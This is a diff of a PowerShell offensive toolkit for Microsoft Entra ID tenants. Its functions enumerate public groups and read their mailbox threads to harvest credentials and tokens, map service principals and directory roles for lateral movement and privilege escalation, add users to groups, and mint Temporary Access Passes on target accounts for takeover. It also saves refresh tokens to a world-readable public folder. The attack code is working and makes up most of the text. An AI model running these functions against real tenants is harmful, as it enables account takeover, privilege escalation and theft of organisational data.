 			Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"
 
@@ -441,7 +552,7 @@ function Invoke-FindDynamicGroups {
 					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
 					$RefreshToken = Get-DeviceCodeToken
 					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
-					Write-Host "[SAVE] refresh token writen to C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
+				    Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
 					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
 			}
 
@@ -565,16 +676,51 @@ function Invoke-FindDynamicGroups {
 
 
 <###############################################################################################################################################>
-
+<###############################################################################################################################################>
 
 function Invoke-FindPublicGroups {
 
-		<#
+    <#
+    .SYNOPSIS
+        Enumerate public Microsoft 365 groups in the target Entra ID tenant, and optionally read their message content.
 
-		Invoke-FindPublicGroup -DomainName shakudw.local -RefreshToken -DomainName <domain.local>
-		Invoke-FindPublicGroup -DomainName shakudw.local -DeviceCodeFlow -DomainName <domain.local>
-		Invoke-FindPublicGroup -DomainName shakudw.local -ClientId -ClientSecret -DomainName <domain.local>		
-		#>
+    .DESCRIPTION
+        This function identifies all Microsoft 365 groups in the target tenant that are marked as `Public`, 
+        meaning that any authenticated user (including external/B2B users) can add themselves to the group without approval.
+
+        These groups may grant access to sensitive resources (e.g., SharePoint, Teams, Planner), and in some cases 
+        be linked to directory roles or privileged permissions.
+
+        Using the optional `-Deep` flag, the function will attempt to read public conversations (group mailbox threads) 
+        and extract potentially sensitive content such as credentials, tokens, or internal communications.
+
+    .PARAMETER DomainName
+        The target Entra ID domain name (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token for authentication.
+
+    .PARAMETER DeviceCodeFlow
+        Use this switch for interactive authentication via device code.
+
+    .PARAMETER ClientId
+        Client ID for service principal authentication.
+
+    .PARAMETER SecretId
+        Client secret corresponding to the given Client ID.
+
+    .PARAMETER Deep
+        Enables enumeration of public conversations (emails) in each public group.
+
+    .EXAMPLE
+        Invoke-FindPublicGroups -DomainName ShkudW.com -DeviceCodeFlow
+        Invoke-FindPublicGroups -DomainName ShkudW.com -RefreshToken <token>
+        Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId <id> -SecretId <secret>
+
+        Deep flag for conversations info:
+        Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId <id> -SecretId <secret> | -RefreshToken <token> | -DeviceCodeFlow -Deep
+    #>
+
 
     param (
         [Parameter(Mandatory = $false)] [string]$RefreshToken,
@@ -584,36 +730,61 @@ function Invoke-FindPublicGroups {
         [Parameter(Mandatory = $false)] [string]$SecretId,
         [Parameter(Mandatory = $false)] [switch]$Deep		
     )
-	
-        function Get-DomainName {
-            param (
-                [Parameter(Mandatory = $true)] [string]$DomainName
-            )
-                try {
-                    $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
-                    $TenantID = ($response.issuer -split "/")[3]
-                    Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
-                    return $TenantID
-                } catch {
-                    Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-                return $null
-                }
-        }   
-	
-        function Example {
-                Write-Host "Invoke-FindPublicGroups:" -ForegroundColor DarkYellow
-                Write-Host "------------" -ForegroundColor DarkYellow
-                Write-Host "Invoke-FindPublicGroups -DeviceCodeFlow -DomainName <domain.local>" -ForegroundColor DarkCyan
-                Write-Host "Invoke-FindPublicGroups -RefreshToken <Refresh_Token> -DomainName <domain.local>" -ForegroundColor DarkCyan
-                Write-Host "Invoke-FindPublicGroups -ClientId <Application_ClientID> -SecretId <Application_SecretID> -DomainName <domain.local>" -ForegroundColor DarkCyan
-        }
 
-        if (-not $RefreshToken -and -not $ClientId -and -not $SecretId -and -not $DeviceCodeFlow -and -not $Deap -and -not $DomainName) {
-            Example
-            return
-        }
 
-    
+        function Help {
+			Write-Host "Invoke-FindPublicGroups" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-FindPublicGroups -DomainName ShkudW.com -DeviceCodeFlow " -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-FindPublicGroups -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....'" -ForegroundColor DarkBlue
+			Write-Host "Deep flag: Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' | -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......' | -DeviceCodeFlow -Deep  " -ForegroundColor DarkBlue
+		}
+
+            if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName) {
+                Help
+                return
+            }
+
+            if ($DomainName -and -not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow) {
+                Write-Host "[!] You need to provide a Refresh Token or ClientID + ClientSecret or using Device Code Flow" -ForegroundColor DarkYellow
+                Help
+                return
+            }
+
+             if ($DomainName -and $ClientId -and -not $ClientSecret) {
+                Write-Host "[!] You need to provide Clientid and Client Secret" -ForegroundColor DarkYellow
+                Help
+                return
+            }   
+
+            if ($DomainName -and $ClientId -and $ClientSecret -and $RefreshToken -and $DeviceCodeFlow -and $Deep) {
+                Write-Host "[!] What?!?" -ForegroundColor DarkYellow
+                Help
+                return
+            }           
+
+	
+		function Get-DomainName {
+			try {
+				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
+				$TenantID = ($response.issuer -split "/")[3]
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				return $TenantID
+			} catch {
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
+		}  
+	
+
+        if (-not $TenantID -and $DomainName) {
+            $TenantID = Get-DomainName -DomainName $DomainName
+            if (-not $TenantID) {
+                 Write-Error "[-] Cannot continue without Tenant ID."
+                return
+            }
+        }
 
         function Get-DeviceCodeToken {
                 $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
@@ -655,15 +826,6 @@ function Invoke-FindPublicGroups {
                         }
                     }
                 }
-        }
-
-   
-       	if (-not $TenantID -and $DomainName) {
-            $TenantID = Get-DomainName -DomainName $DomainName
-            if (-not $TenantID) {
-                 Write-Error "[-] Cannot continue without Tenant ID."
-                return
-            }
         }
 
 		function Get-Token-WithRefreshToken {
@@ -711,7 +873,7 @@ function Invoke-FindPublicGroups {
 					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
 					$RefreshToken = Get-DeviceCodeToken
 					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
-					Write-Host "[SAVE] refresh token writen to C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
+				    Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
 					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
 			}
 
@@ -999,14 +1161,75 @@ function Invoke-FindPublicGroups {
 
 
 <###############################################################################################################################################>
+<###############################################################################################################################################>
 
 
 function Invoke-FindServicePrincipal {
+
+
+    <#
+    .SYNOPSIS
+        Enumerate service principals that support delegated user access in the target Entra ID tenant.
+
+    .DESCRIPTION
+        This function queries the target Entra ID tenant to identify service principals (enterprise applications) 
+        that are configured to allow delegated user permissions via OAuth2.
+
+        It highlights which applications can be used to access resources on behalf of a user (through `user_impersonation`), 
+        and extracts their associated App IDs and OAuth2 API endpoints (e.g., `replyUrls`, `identifierUris`, etc.).
+
+        This information is useful for identifying potential lateral movement vectors, token replay opportunities, or 
+        abuse of existing application permissions during post-exploitation.
+
+    .PARAMETER DomainName
+        The domain name of the target tenant (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token for authentication.
+
+    .EXAMPLE
+        Invoke-FindServicePrincipal -DomainName ShkudW.com -RefreshToken <your_token>
+    #>
+
+
     param (
         [Parameter(Mandatory = $true)] [string]$RefreshToken,
-	    [Parameter(Mandatory = $true)] [string]$TenantID
+	    [Parameter(Mandatory = $true)] [string]$DomainName
     )
 
+
+        function Help {
+			Write-Host "Invoke-FindServicePrincipal" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-FindServicePrincipal -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkBlue
+		}
+
+            if (-not $RefreshToken -and -not $DomainName) {
+                Help
+                return
+            }
+
+
+		function Get-DomainName {
+			try {
+				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
+				$TenantID = ($response.issuer -split "/")[3]
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				return $TenantID
+			} catch {
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
+		} 
+
+
+        if (-not $TenantID -and $DomainName) {
+            $TenantID = Get-DomainName -DomainName $DomainName
+            if (-not $TenantID) {
+                 Write-Error "[-] Cannot continue without Tenant ID."
+                return
+            }
+        }
 
         function Get-GraphAccessToken {
 
@@ -1135,25 +1358,37 @@ function Invoke-FindServicePrincipal {
             }
         }
 
-    $output | Out-File -FilePath "ServicePrincipals_DeviceFlow_Eligible.txt" -Encoding UTF8
-    Write-Host "`n✅ Exported to ServicePrincipals_DeviceFlow_Eligible.txt" -ForegroundColor Green
+    $output | Out-File -FilePath "ServicePrincipals.txt" -Encoding UTF8
+    Write-Host "Exported to ServicePrincipals.txt" -ForegroundColor Green
 }
 
 
-
+<###############################################################################################################################################>
 <###############################################################################################################################################>
 
 
 function Invoke-FindUserRole {
-<#
+    <#
+    .SYNOPSIS
+        Enumerate all users (UPNs) in the target Entra ID tenant and identify their assigned directory roles.
 
-Enumerate all UPN in Tenant, and what directory role have to each one
+    .DESCRIPTION
+        This function retrieves all user accounts (User Principal Names) in the specified Entra ID tenant and 
+        maps their assigned Azure AD (directory) roles, such as Global Administrator, Privileged Role Administrator, User Administrator, etc.
 
-Invoke-FindUserRole -RefreshToken <Refresh Token> -DomainName <domain.local>
+        This is particularly useful during reconnaissance and privilege escalation mapping, helping to identify 
+        high-value targets or misconfigured role assignments.
 
+    .PARAMETER DomainName
+        The domain name of the target tenant (e.g., ShkudW.com).
 
+    .PARAMETER RefreshToken
+        A valid refresh token for authentication.
 
-#>
+    .EXAMPLE
+        Invoke-FindUserRole -DomainName ShkudW.com -RefreshToken <your_token>
+    #>
+
 
     param(
         [Parameter(Mandatory = $true)] [string]$RefreshToken,
@@ -1161,16 +1396,38 @@ Invoke-FindUserRole -RefreshToken <Refresh Token> -DomainName <domain.local>
 
     )
 
-    	function Get-DomainName {
-            try {
-                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
-                $TenantID = ($response.issuer -split "/")[3]
-                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
-                 return $TenantID
-            } catch {
-                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-                return $null
-             }
+
+        function Help {
+			Write-Host "Invoke-FindUserRole" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-FindUserRole -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkBlue
+		}
+
+            if (-not $RefreshToken -and -not $DomainName) {
+                Help
+                return
+            }
+
+
+		function Get-DomainName {
+			try {
+				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
+				$TenantID = ($response.issuer -split "/")[3]
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				return $TenantID
+			} catch {
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
+		} 
+
+
+        if (-not $TenantID -and $DomainName) {
+            $TenantID = Get-DomainName -DomainName $DomainName
+            if (-not $TenantID) {
+                 Write-Error "[-] Cannot continue without Tenant ID."
+                return
+            }
         }
 
         function Get-Token-WithRefreshToken {
@@ -1294,20 +1551,36 @@ Invoke-FindUserRole -RefreshToken <Refresh Token> -DomainName <domain.local>
 }
 
 
-
-
+<######################################################################################################################################################>
 <######################################################################################################################################################>
 
 
 function Invoke-FindUserByWord {
 
-<#
+    <#
+    .SYNOPSIS
+        Search for user accounts in the target Entra ID tenant by matching a specific keyword.
 
-Find a user account by searching spesicip word
+    .DESCRIPTION
+        This function performs a keyword-based search across user accounts in the specified Entra ID tenant. 
+        It checks attributes such as `userPrincipalName`, `displayName`, and `mail` for matches with the provided keyword.
 
-Invoke-FindUserByWord -RefreshToken <Refresh Token> -DomainName <domain.local> -Word admin
+        Common use cases include finding accounts with names like "admin", "svc", "test", or department-specific identifiers 
+        that may indicate privileged or interesting users.
 
-#>
+    .PARAMETER DomainName
+        The domain name of the target tenant (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token used for authentication.
+
+    .PARAMETER Word
+        The keyword to search for within user account attributes.
+
+    .EXAMPLE
+        Invoke-FindUserByWord -DomainName ShkudW.com -RefreshToken <your_token> -Word admin
+    #>
+
 
     param(
         [Parameter(Mandatory = $true)] [string]$RefreshToken,
@@ -1315,20 +1588,48 @@ Invoke-FindUserByWord -RefreshToken <Refresh Token> -DomainName <domain.local> -
 		[Parameter(Mandatory = $true)] [string]$Word
     )
 
+
+        function Help {
+			Write-Host "Invoke-FindUserByWord" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-FindUserByWord -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......' -Word 'sqladmin' " -ForegroundColor DarkBlue
+		}
+
+            if (-not $RefreshToken -and -not $DomainName -and -not $Word) {
+                Help
+                return
+            }
+
+            if ($RefreshToken -and $DomainName -and -not $Word) {
+                Write-Host "[!] You need to provide a Work to search" -ForegroundColor DarkYellow
+                Help
+                return
+            }
+
+
 	    $OutputFile = "FoundUsers.txt"
 	    if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }
 
 
-    	function Get-DomainName {
-            try {
-                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
-                $TenantID = ($response.issuer -split "/")[3]
-                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
-                 return $TenantID
-            } catch {
-                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-                return $null
-             }
+		function Get-DomainName {
+			try {
+				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
+				$TenantID = ($response.issuer -split "/")[3]
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				return $TenantID
+			} catch {
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
+		} 
+
+
+        if (-not $TenantID -and $DomainName) {
+            $TenantID = Get-DomainName -DomainName $DomainName
+            if (-not $TenantID) {
+                 Write-Error "[-] Cannot continue without Tenant ID."
+                return
+            }
         }
 
 
@@ -1423,6 +1724,7 @@ Invoke-FindUserByWord -RefreshToken <Refresh Token> -DomainName <domain.local> -
 
 
 <######################################################################################################################################################>
+<######################################################################################################################################################>
 
 function Invoke-GroupMappingFromJWT {
 
@@ -1438,6 +1740,16 @@ Invoke-GroupMappingFromJWT -jwt <eyJ0eXAiOiJKV1QiLCJhbG...> -GraphAccessToken <e
         [Parameter(Mandatory = $true)][string]$jwt,
         [Parameter(Mandatory = $true)][string]$GraphAccessToken
     )
+
+        function Help {
+			Write-Host "Invoke-GroupMappingFromJWT" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-GroupMappingFromJWT -jwt 'eyJ0eXAiOiJKV1QiLCJhb.....' -GraphAccessToken 'eyJ0eXAiOiJKV1QiLCJub2....' " -ForegroundColor DarkBlue
+		}
+
+            if (-not $jwt -and -not $GraphAccessToken) {
+                Help
+                return
+            }
 
         function Decode-JWT {
             param ([string]$Token)
@@ -1527,13 +1839,52 @@ Invoke-GroupMappingFromJWT -jwt <eyJ0eXAiOiJKV1QiLCJhbG...> -GraphAccessToken <e
 }
 
 <######################################################################################################################################################>
+<######################################################################################################################################################>
+
 
 function Invoke-MembershipChange {
 
-<#
+    <#
+    .SYNOPSIS
+        Add or remove a user (including yourself) from one or more groups in the target Entra ID tenant.
 
-For adding yourself or others to group or list of groups
-#>
+    .DESCRIPTION
+        This function allows you to modify group memberships in Microsoft Entra ID by either adding or removing a specified user 
+        to/from one or more groups. You can provide the target user's Object ID explicitly using the `-UserID` parameter, 
+        or omit it to apply the action to yourself (in which case the script extracts your Object ID automatically using the access token).
+
+        The script supports both interactive authentication (via refresh token or client credentials) and batch operations across multiple group IDs.
+
+    .PARAMETER DomainName
+        The domain name of the target tenant (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token used for authentication.
+
+    .PARAMETER ClientID
+        Application (client) ID for service principal authentication.
+
+    .PARAMETER ClientSecret
+        Client secret for the specified client ID.
+
+    .PARAMETER UserID
+        Object ID of the target user to add/remove from the group(s). If not provided, the script will extract your own user ID.
+
+    .PARAMETER GroupIdsInput
+        One or more Group Object IDs (single value or array) to which the user should be added or removed.
+
+    .PARAMETER Action
+        Specify whether to `Add` or `Delete` the user from the group(s).
+
+
+    .EXAMPLE
+        Invoke-MembershipChange -DomainName ShkudW.com -RefreshToken <token> -UserID <targetUserId> -GroupIdsInput C:\Path-to-Your-File\groupids.txt -Action Add | Delete
+        Invoke-MembershipChange -DomainName ShkudW.com -ClientID <appId> -ClientSecret <secret> -UserID <targetUserId> -GroupIdsInput C:\Path-to-Your-File\groupids.txt -Action Add | Delete
+
+        You can use either your Refresh Token or a Client ID with Client Secret, without specifying the 'UserId' parameter, to add or remove your own account from a single group or a list of groups.
+
+    #>
+
     param(
         [Parameter(Mandatory = $false)][string]$RefreshToken,
 		[Parameter(Mandatory = $false)][string]$ClientID,
@@ -1547,22 +1898,45 @@ For adding yourself or others to group or list of groups
 		
     )
 
+        function Help {
+			Write-Host "Invoke-MembershipChange" -ForegroundColor DarkBlue
+ 			Write-Host "    Without getting any 'UserID' it will use you UserID from AccessToken" -ForegroundColor DarkYellow          
+			Write-Host "    Usage: Invoke-MembershipChange -DomainName ShkudW.com -RefreshToken 'eyJ0eXAiOiJKV1QiLCJhb.....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkBlue
+			Write-Host "         : Invoke-MembershipChange -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkBlue
+ 			Write-Host "    With getting 'UserID'" -ForegroundColor DarkYellow  
+			Write-Host "    Usage: Invoke-MembershipChange -DomainName ShkudW.com  -UserID <User-ID> -RefreshToken 'eyJ0eXAiOiJKV1QiLCJhb.....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-MembershipChange -DomainName ShkudW.com  -UserID <User-ID> -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkBlue
 
 
-    	function Get-DomainName {
-            try {
-                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
-                $TenantID = ($response.issuer -split "/")[3]
-                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
-                 return $TenantID
-            } catch {
-                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-                return $null
-             }
-        }
+
+		}
+
+            if (-not $RefreshToken -and -not $ClientID -and -not $ClientSecret -and -not $UserID -and -not $DomainName -and -not $Action) {
+                Help
+                return
+            }
+
+            if ($RefreshToken -and $ClientID -and $ClientSecret) {
+                Write-Host "[!] You are can not provide Refresh Token and ClientID+ClientSecret together" -ForegroundColor DarkYellow
+                Help
+                return
+            }
+
+		function Get-DomainName {
+			try {
+				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
+				$TenantID = ($response.issuer -split "/")[3]
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				return $TenantID
+			} catch {
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
+		} 
 
 
-       	if ($DomainName) {
+        if (-not $TenantID -and $DomainName) {
             $TenantID = Get-DomainName -DomainName $DomainName
             if (-not $TenantID) {
                  Write-Error "[-] Cannot continue without Tenant ID."
@@ -1618,7 +1992,7 @@ For adding yourself or others to group or list of groups
 				Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
 				$RefreshToken = Get-DeviceCodeToken
 				Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
-				Write-Host "[FOR YOU BABY] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
+				Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
 				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
 			}
 		if (-not $GraphAccessToken) { return }
@@ -2714,10 +3088,8 @@ else {
 
 function Invoke-TAPChanger {
     param(
-        [Parameter(Mandatory)]
-        [string]$UseTargetID,
-        [Parameter(Mandatory)]
-        [string]$AccessToken,
+        [Parameter(Mandatory)] [string]$UseTargetID,
+        [Parameter(Mandatory)] [string]$AccessToken,
         [switch]$Add,
         [switch]$Delete,
         [int]$LifetimeMinutes = 60,
@@ -2725,78 +3097,78 @@ function Invoke-TAPChanger {
         [datetime]$StartDateTime
     )
 
-    function New-TemporaryAccessPass {
-        param(
-            [string]$UserId,
-            [string]$Token,
-            [int]$Minutes,
-            [bool]$UsableOnce,
-            [datetime]$Start
-        )
+        function New-TemporaryAccessPass {
+            param(
+                [string]$UserId,
+                [string]$Token,
+                [int]$Minutes,
+                [bool]$UsableOnce,
+                [datetime]$Start
+            )
 
-        $url = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
-
-        $body = @{
-            lifetimeInMinutes = $Minutes
-            isUsableOnce      = $UsableOnce
-        }
-
-        if ($Start) {
-            $body.startDateTime = $Start.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
-        }
-
-        $headers = @{
-            Authorization = "Bearer $Token"
-            "Content-Type" = "application/json"
-        }
-
-        try {
-            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ($body | ConvertTo-Json -Depth 10)
-            Write-Host "[+] TAP Created Successfully" -ForegroundColor Green
-            Write-Host "    TemporaryAccessPass : $($response.temporaryAccessPass)"
-            Write-Host "    StartDateTime       : $($response.startDateTime)"
-        } catch {
-            Write-Error "[-] Failed to create TAP: $_"
-        }
-    }
-
-    function Remove-TemporaryAccessPass {
-        param(
-            [string]$UserId,
-            [string]$Token
-        )
-
-        $baseUrl = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
-        $headers = @{
-            Authorization = "Bearer $Token"
-            "Content-Type" = "application/json"
-        }
-
-        try {
-            $methods = Invoke-RestMethod -Uri $baseUrl -Method Get -Headers $headers
-            foreach ($method in $methods.value) {
-                $deleteUrl = "$baseUrl/$($method.id)"
-                Invoke-RestMethod -Uri $deleteUrl -Method Delete -Headers $headers
-                Write-Host "[+] TAP Deleted: $($method.id)" -ForegroundColor Yellow
+            $url = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
+            $body = @{
+                lifetimeInMinutes = $Minutes
+                isUsableOnce      = $UsableOnce
             }
-        } catch {
-            Write-Error "[-] Failed to delete TAP(s): $_"
+
+            if ($Start) {
+                $body.startDateTime = $Start.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+            }
+
+            $headers = @{
+                Authorization = "Bearer $Token"
+                "Content-Type" = "application/json"
+            }
+
+            try {
+                $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ($body | ConvertTo-Json -Depth 10)
+                Write-Host "[+] TAP Created Successfully" -ForegroundColor Green
+                Write-Host "    TemporaryAccessPass : $($response.temporaryAccessPass)"
+                Write-Host "    StartDateTime       : $($response.startDateTime)"
+            } catch {
+                Write-Error "[-] Failed to create TAP: $_"
+            }
         }
-    }
 
-    if ($Add) {
-        if ($PSBoundParameters.ContainsKey('StartDateTime')) {
-			New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce -Start $StartDateTime
-		} else {
-			New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce
-		}
 
-    }
+        function Remove-TemporaryAccessPass {
+            param(
+                [string]$UserId,
+                [string]$Token
+            )
 
-    if ($Delete) {
-        Remove-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken
-    }
+            $baseUrl = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
+            $headers = @{
+                Authorization = "Bearer $Token"
+                "Content-Type" = "application/json"
+            }   
+
+            try {
+                $methods = Invoke-RestMethod -Uri $baseUrl -Method Get -Headers $headers
+                foreach ($method in $methods.value) {
+                    $deleteUrl = "$baseUrl/$($method.id)"
+                    Invoke-RestMethod -Uri $deleteUrl -Method Delete -Headers $headers
+                    Write-Host "[+] TAP Deleted: $($method.id)" -ForegroundColor Yellow
+                }
+            } catch {
+                Write-Error "[-] Failed to delete TAP(s): $_"
+            }
+        }
+
+        if ($Add) {
+            if ($PSBoundParameters.ContainsKey('StartDateTime')) {
+			    New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce -Start $StartDateTime
+		    } else {
+			    New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce
+		    }
+
+        }
+
+        if ($Delete) {
+            Remove-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken
+        }
 }
 
 
- 
+ <################################################################################################################################################>
